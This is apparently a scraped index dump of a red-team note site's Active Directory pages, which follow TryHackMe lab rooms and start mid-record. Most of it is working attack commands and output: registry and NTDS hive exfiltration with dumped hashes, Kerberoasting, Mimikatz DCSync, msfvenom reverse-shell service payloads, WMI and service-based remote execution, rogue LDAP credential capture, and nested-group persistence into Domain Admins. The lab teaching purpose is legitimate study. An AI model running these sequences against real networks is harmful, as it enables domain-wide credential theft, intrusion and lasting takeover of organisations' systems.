11/10/2022 01:53 AM <DIR> .. 06/13/2022 09:40 AM 65,536 SECURITY 06/13/2022 09:40 AM 20,971,520 SYSTEM 2 File(s) 21,037,056 bytes 2 Dir(s) 10,265,694,208 bytes free c:\\temp\\registry>scp .\\SECURITY nina@10.18.22.77:/home/nina/Downloads/last/ nina@10.18.22.77's password: SECURITY 100% 64KB 455.2KB/s 00:00 c:\\temp\\registry>scp .\\SYSTEM nina@10.18.22.77:/home/nina/Downloads/last/ nina@10.18.22.77's password: SYSTEM 100% 20MB 1.2MB/s 00:17 c:\\temp\\registry> Extract hashes from NTDS locally: $ ls ntds.dit SECURITY SYSTEM $ sudo python3 /opt/impacket/examples/secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit local [sudo] password for nina: Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC $MACHINE.ACC:plain_password_hex:c232a51e1cdcaaed24259e15687cbfc7a0130457855c918ebfccd5c54ab70c8f5b916aed1554619c1b617918098cb2dd3e3b981c61ccdba2af687d5d4d3a0aa6ae652f6d6c05cc30f21c75bd268107a5d07f60a0ef156073d5dc0282fe87d819d2ad387ab71ffc53fc56a34350ac3c2f990ca9aacacc615ab78576a52033dd468d1b6cf29f9ca18fb3c97b523e0289a0df7806b2a4d303714483d548fbb0866068cd17bad7c21ab5a00e863d17c8f6ddf88f6a3d72b425b231d6963968e7fbeba968e119f4c296cf600c2f53f31f2b383bf53cf1b9cbe0afccb04b36ce1759c91ffebf1649d9aea4c66c4b59f0f2a3f1 $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b1800dfad5dc7a67143f158c68497624 [*] DPAPI_SYSTEM dpapi_machinekey:0x0e88ce11d311d3966ca2422ac2708a4d707e00be dpapi_userkey:0x8b68be9ef724e59070e7e3559e10078e36e8ab32 [*] NL$KM 0000 8D D2 8E 67 54 58 89 B1 C9 53 B9 5B 46 A2 B3 66 ...gTX...S.[F..f 0010 D4 3B 95 80 92 7D 67 78 B7 1D F9 2D A5 55 B7 A3 .;...}gx...-.U.. 0020 61 AA 4D 86 95 85 43 86 E3 12 9E C4 91 CF 9A 5B a.M...C........[ 0030 D8 BB 0D AE FA D3 41 E0 D8 66 3D 19 75 A2 D1 B2 ......A..f=.u... NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 55db1e9562985070bbba0ef2cc25754c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:b1800dfad5dc7a67143f158c68497624::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d::: thm.red\\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889::: thm.red\\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207::: thm.red\\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f::: thm.red\\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f::: sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666::: [*] Kerberos keys from ntds.dit Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30 Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0 Administrator:des-cbc-md5:6d34e608f8574632 CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:508aa735622e15c3fdd0a12f52ce779fa382205b828bdc0f441ddfeaef1bbf13 CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:db9e72cb40e0f8b93a7f44e7f79669fc CREDS-HARVESTIN$:des-cbc-md5:f434a7298562ec6e krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3 krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c krbtgt:des-cbc-md5:d92ffd4abf02b049 thm.red\\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca thm.red\\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c thm.red\\thm:des-cbc-md5:794f3889e646e383 thm.red\\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac thm.red\\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529 thm.red\\victim:des-cbc-md5:457cdc673d3b0d85 thm.red\\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26 thm.red\\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf thm.red\\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4 thm.red\\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f thm.red\\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6 thm.red\\admin:des-cbc-md5:32a8a201d3080b2f thm.red\\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d thm.red\\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d thm.red\\svc-thm:des-cbc-md5:f8e57c49f7dc671c thm.red\\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e thm.red\\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546 thm.red\\bk-admin:des-cbc-md5:108cc2b0d3100767 thm.red\\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660 thm.red\\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64 thm.red\\test-user:des-cbc-md5:aec8e3325b85316b...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4ad518bee3836c5472065f3322e34fbe",
    "u": "https://ad.tymyrddin.dev/docs/harvest/hashes",
    "t": "Hashes and tickets ",
    "c": "Hashes and tickets  $ python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.74.3 THM.red/thm Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------- -------- -------------------------- --------- ---------- http/creds-harvestin.thm.red svc-thm 2022-06-10 10:47:33.796826 <never> $ python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.74.3 THM.red/thm -request-user svc-thm Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------- -------- -------------------------- --------- ---------- http/creds-harvestin.thm.red svc-thm 2022-06-10 10:47:33.796826 <never> [-] CCache file is not found. Skipping... [ticket] Hashcat: $ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2d64a1400df48fe8467f0e0707547013",
    "u": "https://ad.tymyrddin.dev/docs/pivot/moving",
    "t": "Moving through the network ",
    "c": "Moving through the network  Local administrator accounts may be repeated across multiple hosts on the network. Even if that is the case a local administrator cannot access a computer remotely with admin privileges using WinRM, SMB, or RPC. The local administrator must use RDP to open an administrative session on a host. This setting can be changed. The built-in default administrator account is not subject to UAC, while other local administrator accounts are. Domain accounts with local admin can open an administrative login using RDP, WinRM, SMB, or RPC. This can be disabled.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a946e73ccb1e84a130587556b2c0385f",
    "u": "https://ad.tymyrddin.dev/docs/persist/creds",
    "t": "Persistence through credentials ",
    "c": "Persistence through credentials  It is not sufficient to have a single domain controller per domain in large organisations. These domains are often used in multiple regional locations, and having a single DC would significantly delay any authentication services in AD. These organisations make use of multiple DCs. Each domain controller runs a process called the Knowledge Consistency Checker (KCC). The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information. This includes updated information such as the user’s new password and new objects such as when a new user is created. The process of replication is called DC Synchronisation. It is not just the DCs that can initiate replication. Accounts such as those belonging to the Domain Admins groups can also do it for legitimate purposes such as creating a new domain controller. A popular attack to perform is a DC Sync attack. With access to an account that has domain replication permissions, it is possible to stage a DC Sync attack to harvest credentials from a DC. Passwords  Passwords can easily be changed and will be changed by the blue team when an attacker is discovered. More reliable credentials would be: Local Administrative Accounts (Could still maintain a presence on multiple machines) Delegate Accounts (Given the right delegation, could generate silver or golden tickets) AD Service Credentials (WSUS, SCCM, Could force changes on the network) Order of Operations  Use your unprivileged credentials from the distributor to facilitate initial access Use the given Administrator credentials to perform privileged operations. Pretend that these are credentials you’ve obtained during the exploitation phase . DC Sync  SSH to THMWRK1 : ssh administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc To do a DC Sync of a single account DC Sync with Mimikatz, test it on the user credential obtained from the distributor: powershell.exe -ep bypass C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe mimikatz # lsadump::dcsync /domain:za.tryhackmloc /user:user.name To dcsync all users from the domain controller: Specify a log file in the Mimikatz session Or, exit Mimikatz and run a one-liner Log file  To enable logging on Mimikatz (change user.name to the one received from the distributor): mimikatz # log <user.name>_dcdump.txt Using '<user.name>_dcdump.txt' for logfile: OK Use the /all flag: mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all Takes a while … Once done, exit Mimikatz to finalise the dump find. Download the <user.name>_dcdump.txt or dcsyncall.txt file: scp administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc:C:/Users/Administrator.ZA/<user.name>_dcdump.txt . Recover all the usernames: cat <user.name>_dcdump.txt | grep \"SAM Username\" Recover all hashes: cat <user.name>_dcdump.txt | grep \"Hash NTLM\" One-liner  The better solution because it keeps the log files clean: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe 'lsadump::dcsync /domain:za.tryhackme.loc /all' > dcsyncall.txt Download the dcsyncall.txt file: scp administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc:C:/Users/Administrator.ZA/dcsyncall.txt . Remove Windows CRLF line endings and change to utf8 encoding dos2unix dcsyncall.txt Inspect the file with the less command, using the arrow keys to navigate, and searching for a term by hitting the / key: less dcsyncall.txt",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2f05a9495afdd1e7eb59e97693ede679",
    "u": "https://ad.tymyrddin.dev/docs/pivot/spawning",
    "t": "Spawning processes remotely ",
    "c": "Spawning processes remotely  Remote Session Port(s) Requirements PsExec TCP/445 Account must be an administrator WinRM over HTTP TCP/5985 Group Memberships: Remote Management Users WinRM over HTTPS TCP/5986 Group Memberships: Remote Management Users DCE/RPC TCP/135, TCP/49152-65535 Group Memberships: Administrators RPC over SMB Named Pipes TCP/445 Group Memberships: Administrators RPC over SMB Named Pipes TCP/139 Group Memberships: Administrators PsExec  Authentication workflow Connect to Admin$ share and upload a service binary psexesvc.exe . Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\\Windows\\psexesvc.exe . Create some named pipes to handle stdin / stdout / stderr . Start a remote command prompt: .\\psexec.exe \\\\<IP target> -u <username> -p <password> -i cmd.exe WinRM  PowerShell: $username = 'user.name' $password = 'mypass' | ConvertTo-SecureString -AsPlainText -Force $credential = [pscredential]::new($username, $password) $session = New-PSSession -ComputerName target-ip -Credential $credential $session | Enter-PSSession Cleanup: $session | Remove-PSSession A single command: $username = 'user.name' $password = 'mypass' | ConvertTo-SecureString -AsPlainText -Force $credential = [pscredential]::new($username, $password) Invoke-Command -ComputerName target-ip -Credential -ScriptBlock {Get-ComputerInfo} sc.exe  Remote command execution by registering and running services on a host. The service is configured to run a command at start up. Try authenticating to the Service Control Manager using RPC first. If RPC fails: Try communicating using an SMB named pipe Register the fake service ( binpath is the command to run on the host) sc.exe \\\\<IP Target> create <fakeservice> binpath= \"net user <username> <password> /add\" start= auto Start the remote service to run the command: sc.exe \\\\<IP Target> start <fakeservice> Stop and cleanup: sc.exe \\\\<IP Target> stop <fakeservice> sc.exe \\\\<IP Target> delete <fakeservice> schtasks  Remote command/payload execution by registering a scheduled task on a host. Create and run Task: schtasks /s target-ip /RU \"SYSTEM\" /create /tn \"Task\" /tr \"powershell -command 'Get-ComputerInfo'\" /sc ONCE /sd 01/01/1970 /st 00:00 schtasks /s target-ip /run /tn \"Task\" Cleanup: schtasks /s target-ip /tn \"Task\" /DELETE /F Flag  Leverage a session on the jump host to deliver a payload to an IIS web server. The payload will connect back to the attack machine (Kali VM in my case). Use the credentials downloaded (see setup ) to ssh into thmjmp2 : ssh <username>@za.tryhackme.com@thmjmp2.za.tryhackme.com On attack machine, create a service binary payload: msfvenom -p windows/shell_reverse_tcp LHOST=<IP address VPN> LPORT=4444 -f exe-service -o iispwn.exe Use the given credentials to transfer the file to the IIS server: smbclient -c 'put iispwn.exe' -U <username> -W ZA '//thmiis.za.tryhackme.com/ADMIN$' <password> Start a listener to receive the reverse shell from the IIS server: sudo nc -lnvp 4444 Use the ssh session on thmjmp2 as reverse shell (no need for runas etc.): sc.exe \\\\thmiis.za.tryhackme.com create pwniis binpath= \"%windir%\\isspwn.exe\" start= auto sc.exe \\\\thmiis.za.tryhackme.com start pwniis Run the flag.exe file on the users desktop on THMIIS.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "093b6015291fb1fbadbc31ad08ab943f",
    "u": "https://ad.tymyrddin.dev/docs/enum/powershell",
    "t": "Through PowerShell ",
    "c": "Through PowerShell  All domain users: Get-ADUser -Filter * Find any user where name ends in ... phillips : Get-ADUser -Filter 'Name -like \"*phillips\"' Find user beth.nolan and return all properties: Get-ADUser -Identity john.doe -Properties * – All domain groups: Get-ADGroup -Filter * Pipe the Administrators group object to Get-ADGroupMember to retrieve members of the group: Get-ADGroup -Identity Administrators | Get-ADGroupMember Get any domain objects that we modified on or after a specific date and time: $modifiedDate = Get-Date '2022/10/11' Get-ADObject -Filter 'whenChanged -ge $modifiedDate' -IncludeDeletedObjects Get information about the domain from the domain controller: Get-ADDomain Change a User Password: $oldPass = Read-Host -AsSecureString -Prompt 'Enter the old password' $newPass = Read-Host -AsSecureString -Prompt 'Enter the new password' Set-ADAccountPassword -Identity user.name -OldPassword $oldpPass -NewPassword $newPass",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "85c492c2b49421e15a2ce1096456873d",
    "u": "https://ad.tymyrddin.dev/docs/breach/ldap",
    "t": "LDAP bind credentials ",
    "c": "LDAP bind credentials  Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. And with LDAP authentication, the application directly verifies the user’s credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user’s credentials. LDAP authentication is a much used mechanism with third-party (non-Microsoft) applications that integrate with AD. Examples of applications and systems: Gitlab Jenkins Custom-developed web applications Printers VPNs If any of these applications or services are exposed on the internet, the same type of attacks as leveraged against NTLM authenticated systems can be used. And because a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues. We can attempt to recover the AD credentials used by the service to gain authenticated access to AD. LDAP pass-back  A common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom. LDAP Pass-back attacks can be performed when we gain access to a device’s configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Often, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password . Test settings In this case, we can not directly extract the LDAP credentials because the password is hidden: We did find a username though. But we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials. Rogue LDAP server  install OpenLDAP: sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd Reconfigure the LDAP server to use za.tryhackme.com for the DNS domain name and Organisation: sudo dpkg-reconfigure -p low slapd Make it vulnerable by downgrading the supported authentication mechanisms. Create a file olcSaslSecProps.ldif : # olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred olcSaslSecProps : Specifies the SASL security properties noanonymous : Disables mechanisms that support anonymous login minssf : Specifies the minimum acceptable security strength with 0, meaning no protection. Use the ldif file to patch the LDAP: $ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart SASL/EXTERNAL authentication started SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth SASL SSF: 0 modifying entry \"cn=config\" Check: ldapsearch -H ldap:// -x -LLL -s base -b \"\" supportedSASLMechanisms dn: supportedSASLMechanisms: PLAIN supportedSASLMechanisms: LOGIN Capturing LDAP credentials  Click the “Test Settings” at http://printer.za.tryhackme.com/settings.aspx again, the authentication will occur in clear text. If you the rogue LDAP server is configured correctly, and is downgrading the communication, you will receive the following error: “This distinguished name contains invalid syntax”. If you receive this error, you can use a tcpdump to capture the credentials: sudo tcpdump -SX -i breachad tcp port 389 Or fire up Wireshark or tshark and find the cleartext bind request password. Stop the LDAP server. sudo systemctl disable --now slapd",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "47853655c971f82151d07233057c1ff2",
    "u": "https://ad.tymyrddin.dev/docs/persist/group",
    "t": "Persistence through group membership ",
    "c": "Persistence through group membership  Warning  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. The most privileged groups or resources are not always the best choice, as they are often more closely watched for changes by the blue team. Exploiting permission delegation gave privileges to reset user passwords, which would be good for maintaining access to workstations. A local administrator group may be less monitored than a global administrator groups, and a group nested in a privileged group may be the access needed. SSH to THMDC : ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Create groups  Launch PowerShell powershell -ep bypass Create group in the People\\IT OU: New-ADGroup -Path \"OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 1\" -SamAccountName \"THM_nestgroup1\" -DisplayName \"THM Nest Group 1\" -GroupScope Global -GroupCategory Security Create group in the People\\Sales OU: New-ADGroup -Path \"OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 2\" -SamAccountName \"THM_nestgroup2\" -DisplayName \"THM Nest Group 2\" -GroupScope Global -GroupCategory Security Create group in the People\\Consulting OU: New-ADGroup -Path \"OU=CONSULTING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 3\" -SamAccountName \"THM_nestgroup3\" -DisplayName \"THM Nest Group 3\" -GroupScope Global -GroupCategory Security Create group in the People\\Marketing OU: New-ADGroup -Path \"OU=MARKETING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 4\" -SamAccountName \"THM_nestgroup4\" -DisplayName \"THM Nest Group 4\" -GroupScope Global -GroupCategory Security Create group in the People\\IT OU: New-ADGroup -Path \"OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"THM Nest Group 5\" -SamAccountName \"THM_nestgroup5\" -DisplayName \"THM Nest Group 5\" -GroupScope Global -GroupCategory Security Nesting  Add Group 1 to Group 2 Add-ADGroupMember -Identity 'THM_nestgroup2' -Members 'THM_nestgroup1' Add Group 2 to Group 3 Add-ADGroupMember -Identity 'THM_nestgroup3' -Members 'THM_nestgroup2' Add Group 3 to Group 4 Add-ADGroupMember -Identity 'THM_nestgroup4' -Members 'THM_nestgroup3' Add Group 4 to Group 5 Add-ADGroupMember -Identity 'THM_nestgroup5' -Members 'THM_nestgroup4' Add Group 5 to Domain Admins Add-ADGroupMember -Identity 'Domain Admins' -Members 'THM_nestgroup5' Add unprivileged user to Group 1 Add-ADGroupMember -Identity 'THM_nestgroup1' -Members 'user.name' Verify inherited privileges  SSH to thmwrk1 as the unprivileged user. ssh user.name@za.tryhackme.loc@thmwrk1.za.tryhackme.loc Try accessing a privileged resource on the domain controller: dir \\\\thmdc.za.tryhackme.loc\\c$\\Users Volume in drive \\\\thmdc.za.tryhackme.loc\\c$ is Windows Volume Serial Number is 1634-22A9 Directory of \\\\thmdc.za.tryhackme.loc\\c$ 01/04/2022 08:47 AM 103 delete-vagrant-user.ps1 05/01/2022 09:11 AM 169 dns_entries.csv 09/15/2018 08:19 AM <DIR> PerfLogs 05/11/2022 10:32 AM <DIR> Program Files 03/21/2020 09:28 PM <DIR> Program Files (x86) 05/01/2022 09:17 AM 1,725 thm-network-setup-dc.ps1 04/25/2022 07:13 PM <DIR> tmp 05/15/2022 09:16 PM <DIR> Tools 04/27/2022 08:22 AM <DIR> Users 04/25/2022 07:11 PM <SYMLINKD> vagrant [\\\\vboxsvr\\vagrant] 04/27/2022 08:12 PM <DIR> Windows 3 File(s) 1,997 bytes 8 Dir(s) 51,573,755,904 bytes free If this was a real organisation, we would not be creating new groups to nest. Instead, we would make use of the existing groups to perform nesting. This is something you would never do on a normal red team assessment and almost always dechain at this point since it breaks the organisation’s AD structure, and if we sufficiently break it, they would not be able to recover. At this point, even if the blue team was able to kick us out, the organisation would more than likely still have to rebuild their entire AD structure from scratch, resulting in significant damages.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1e760019aecfc1b87935c3bb0ff1458b",
    "u": "https://ad.tymyrddin.dev/docs/breach/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Breaching Active Directory What?  Acquire an initial set of valid Active Directory (AD) credentials for a way to authenticate to AD, allowing further enumeration on AD. Why?  To be able to exploit AD misconfigurations for privilege escalation, lateral movement, and goal execution. How?  The attack surface for gaining an initial set of credentials is usually significant. This is by no means an exhaustive list: NTLM authenticated services LDAP bind credentials Authentication relays Microsoft Deployment Toolkit Configuration files",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1a5f0ea7ad79b4626bac31aad34030de",
    "u": "https://ad.tymyrddin.dev/docs/harvest/access",
    "t": "Credential access ",
    "c": "Credential access  Credential access is where adversaries may find credentials in compromised systems and gain access to user credentials. It helps adversaries to reuse them or impersonate the identity of a user. This is an important step for lateral movement and accessing other resources such as other applications or systems. Obtaining legitimate user credentials is preferred rather than exploiting systems using CVEs. Credentials are stored insecurely in various locations in systems: Unsecured Credentials: Credentials In Files - search a compromised machine for credentials in local or remote file systems. Clear-text files could include sensitive information created by a user, containing passwords, private keys, etc. Database files Memory Password managers Enterprise Vaults Active Directory Network Sniffing PowerShell history  As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt . It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, to look for the password keyword in the Window registry: c:\\Users\\user> reg query HKLM /f password /t REG_SZ /s OR C:\\Users\\user> reg query HKCU /f password /t REG_SZ /s Database Files  Applications use database files to read or write settings, configurations, or credentials. Database files are usually stored locally in Windows operating systems. These files are an excellent target to check and hunt for credentials. Configuration files contains a showcase example of extracting credentials from the local McAfee Endpoint database file. Password Managers  A password manager is an application to store and manage users’ login information for local and Internet websites and services. Since it deals with users’ data, it must be stored securely to prevent unauthorized access. Password Manager applications can be built-in (Windows) or third-party, like KeePass, 1Password, LastPass Misconfiguration and security flaws are found in these applications that let adversaries access stored data. Various tools can be used during the enumeration stage to get sensitive data in password manager applications used by Internet browsers and desktop applications. Memory Dump  The Operating system’s memory is a rich source of sensitive information that belongs to the Windows OS, users, and other applications. Data gets loaded into memory at run time or during the execution. Thus, accessing memory is limited to administrator users who fully control the system. The following are examples of memory stored sensitive data, including clear-text credentials, cached passwords, and AD Tickets. Active Directory  Active Directory stores a lot of information related to users, groups, computers, etc. Thus, enumerating the Active Directory environment is one of the focuses of red team assessments. Active Directory has a solid design, but misconfiguration made by admins makes it vulnerable to various attacks shown in this room. The following are some Active Directory misconfigurations that may leak users’ credentials: Users’ description: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorised access. Group Policy SYSVOL: Leaked encryption keys let attackers access administrator accounts. NTDS: Contains AD users’ credentials, making it a target for attackers. AD Attacks: Misconfiguration makes AD vulnerable to various attacks. Network Sniffing  Gaining initial access to a target network enables attackers to attack local computers, including the AD environment. The Man-In-the-Middle attack against network protocols lets the attacker create a rogue or spoof trusted resources within the network to steal authentication information such as NTLM hashes. Resources  MITRE ATT&CK framework TA0006",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b0bc35781c68ca350136f4c79d2fb8cc",
    "u": "https://ad.tymyrddin.dev/docs/pivot/lateral",
    "t": "Moving laterally using wmi ",
    "c": "Moving laterally using wmi  Connecting to wmi from powershell  Create a credential object for authentication $username = 'user.name' $password = 'password' | ConvertTo-SecureString -AsPlainText -Force $credential = [pscredential]::new($username, $password) Create a CIM session for repeated use: DCOM : Connect to the target via RPC on TCP/135 , RPC will direct the client to high numbered port TCP/49152-65535 WSman : WinRM – connect via HTTP (TCP/5985) or HTTPS (TCP/5986) $server = 'target-ip / fqdn' $sessionopt = New-CimSessionOption -Protocol DCOM $session = New-CimSession -ComputerName $server -Credential $credential -SessionOption $sessionopt -ErrorAction Stop Remote process creation  We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before: $Command = \"powershell.exe -Command Set-Content -Path C:\\text.txt -Value whatever\"; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command } WMI will create the required process silently (it does not show the output of any command). On legacy systems, the same can be done using wmic from the command prompt: wmic.exe /user:<username> /password:<password> /node:TARGET process call create \"cmd.exe /c calc.exe\" Run a command remotely  Run a command in the CIM session to test if the target can connect back to the attack machine as a pre-check to a reverse shell. Used is Parameter splatting . With many thanks to 0xBEN . $kaliVpnIP = 'kali-vpn-ip' $kaliPort = 443 # Try to connect back to Kali on a TCP port of choice $command = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command `\"[Net.Sockets.TcpClient]::new().ConnectAsync('$kaliVpnIP', $kaliPort)`\"\" # Parameter splatting $parameters = @{ CimSession = $session ClassName = 'Win32_Process' MethodName = 'Create' Arguments = @{ CommandLine = $command } } Invoke-CimSession @parameters Creating services remotely  Register a service called fakeservice on the target. This only creates the service and does not execute the command specified in PathName : $parameters = @{ CimSession = $session ClassName = 'Win32_Service' MethodName = 'Create' Arguments = @{ Name = 'fakeservice' DisplayName = 'fakeservice' PathName = 'net user <username> <password> /ADD' ServiceType = [byte]16 StartMode = 'Manual' } } Invoke-CimMethod @parameters Get the service and run it on the target. This will cause the service to run and create the local user username with a password of password . $svc = Get-CimInstance -CimSession $session -ClassName Win32_Service -Filter \"Name LIKE 'fakeservice'\" $svc | Invoke-CimMethod -MethodName StartService Change the command and add the username user to the local Administrators group. $svc | Invoke-CimMethod -MethodName Change -Arguments @{PathName = 'net localgroup Administrators <username> /ADD'} $svc | Invoke-CimMethod -MethodName StartService Cleanup: $svc | Invoke-Cimmethod -MethodName StopService $svc | Invoke-CimMethod -MethodName Delete Scheduled tasks  The action is to run: cmd.exe /c net user add <username> <password> /ADD` . Payload must be split in command and arguments : $command = 'cmd.exe' $arguments = '/c net user <username> <password> /ADD' $parameters = @{ CimSession = $session Execute = $command Argument = $arguments } $action = New-ScheduledTaskAction @parameters Create the task on the remote host and assign it the action stored in the $action variable, then start the task: $parameters = @{ CimSession = $session Action = $action User = 'NT AUTHORITY\\SYSTEM' TaskName = 'taskname' } $task = Register-ScheduledTask @parameters $task | Start-ScheduledTask Add the username user to the local administrators group: $arguments = '/c net user <username> <password> /ADD' $parameters = @{ CimSession = $session Execute = $command Argument = $arguments } $action = New-ScheduledTaskAction @parameters $task = Set-ScheduledTask -CimSession $session -TaskName taskname -Action $action $task | Start-ScheduledTask $task | Unregister-ScheduledTask",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "60972a1214ecd786b5ffce8553dec1d3",
    "u": "https://ad.tymyrddin.dev/docs/pivot/readme",
    "t": "Introduction ",
